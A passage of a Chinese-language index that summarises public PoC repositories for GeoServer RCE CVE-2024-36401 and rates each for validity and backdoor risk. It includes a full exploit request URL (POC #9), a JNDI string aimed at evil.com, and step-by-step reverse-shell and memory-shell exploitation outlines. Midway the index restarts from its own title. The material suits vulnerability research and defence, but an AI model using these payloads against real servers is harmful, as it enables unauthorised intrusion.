**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

总体而言，由于大部分操作依赖用户提供的参数和配置，直接投毒的可能性较低，主要风险在于用户配置不当或使用恶意 payload。投毒风险评估为10%。

**利用方式：**

1.  **准备：** 使用 `msfvenom` 生成反向 shell payload，并在攻击者控制的服务器上启动 HTTP 服务以提供 payload 下载。
2.  **构造恶意请求：**  利用 WFS GetPropertyValue 请求，在 `valueReference` 参数中注入恶意代码，通过 `exec` 函数执行系统命令。
3.  **下载 Payload：** 使用 `wget` 命令从攻击者控制的服务器下载反向 shell payload。
4.  **执行 Payload：**  使用 `chmod +x` 命令赋予 payload 执行权限，然后执行 payload 以获得反向 shell。

**项目地址:** [daniellowrie/CVE-2024-36401-PoC](https://github.com/daniellowrie/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #14

**来源**: [CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-funnyDog896_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未授权的攻击者可以通过构造恶意请求执行任意代码

**影响版本:** 受影响版本： < 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 目标GeoServer实例对外开放且未应用补丁或缓解措施

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中存在的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式导致。攻击者可以利用此漏洞通过构造特制的OGC请求（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）在目标服务器上执行任意代码。

**有效性：**
根据漏洞信息、搜索引擎结果，特别是CISA的已知被利用漏洞列表，以及提供的利用代码（WoodpeckerPlugin），可以判断此漏洞POC**有效**并且已被积极利用。

**投毒风险：**
提供的 WoodpeckerPlugin 旨在简化漏洞利用过程，但也存在一定投毒风险。风险点在于：
1.  **自定义内存马注入：** 虽然插件提供了默认的冰蝎内存马，但允许用户自定义内存马，如果用户不熟悉内存马，可能引入恶意代码。
2.  **Woodpecker 框架：** 该插件依赖于 Woodpecker 框架，若框架本身存在安全问题，则会影响所有插件。
3.  **源码审查不足：** 用户可能直接使用编译好的插件，而未进行充分的源码审查，增加了潜在的风险。虽然作者声明免责，但是下载来路不明的jar包，本身就存在风险。
4.  **命令执行的安全性：** 通过`command`参数执行任意命令，本身权限过大，存在风险。命令日志记录是否完善，也会影响溯源。
综合评估，投毒风险大约为10%，风险较低，主要集中在用户自定义操作上。

**利用方式：**
1.  **探测：** 使用插件的 Poc 模块进行批量探测，判断目标是否存在 CVE-2024-36401 漏洞。
2.  **命令执行：** 通过 Exploit 模块，设置 `command` 参数执行任意命令。
3.  **内存马注入：** 使用默认或自定义的内存马，注入到 GeoServer 进程中，实现更持久的控制。

**缓解措施：**
1.  升级 GeoServer 到已修复的版本 (>= 2.22.6, >= 2.23.6, >= 2.24.4, >= 2.25.2)。
2.  移除 `gt-complex-x.y.jar` 文件（可能影响部分功能）。
3.  使用防火墙或其他安全设备限制对 GeoServer 的访问。
4.  加强对GeoServer日志的监控，及时发现异常行为。

**项目地址:** [funnyDog896/CVE-2024-36401-WoodpeckerPlugin](https://github.com/funnyDog896/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #15

**来源**: [CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md](../2024/CVE-2024-36401-jakabakos_CVE-2024-36401-GeoServer-RCE.md)

# CVE-2024-36401

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-36401-0x0d3ad_CVE-2024-36401.md](../2024/CVE-2024-36401-0x0d3ad_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0, < 2.23.6, >= 2.24.0, < 2.24.4, >= 2.25.0, < 2.25.2

**利用条件:** 需要能够访问GeoServer服务的网络连接，默认安装环境

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，由于不安全地将属性名称评估为 XPath 表达式而导致。攻击者可以通过构造特制的 OGC 请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来利用此漏洞，从而在服务器上执行任意代码。提供的 POC 代码首先通过 GET 请求 `/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0` 获取 `ReturnFeatureType`，然后构造一个包含恶意 XPath 表达式的 POST 请求，发送到 `/geoserver/wfs`，表达式中利用 `java.lang.Runtime.getRuntime()` 执行 base64 编码的反弹 shell 命令。POC中的投毒风险较低，主要体现在脚本中可能包含潜在的恶意代码，或者利用社会工程学诱导用户执行恶意操作。例如，如果脚本被修改为下载和执行额外的恶意负载，或者收集用户的敏感信息，就会造成更大的安全威胁。 此处的"poison"指的是，如果攻击者上传包含后门代码的图层定义，然后诱导其他用户下载并使用该定义，则可能构成投毒攻击。

**项目地址:** [0x0d3ad/CVE-2024-36401](https://github.com/0x0d3ad/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

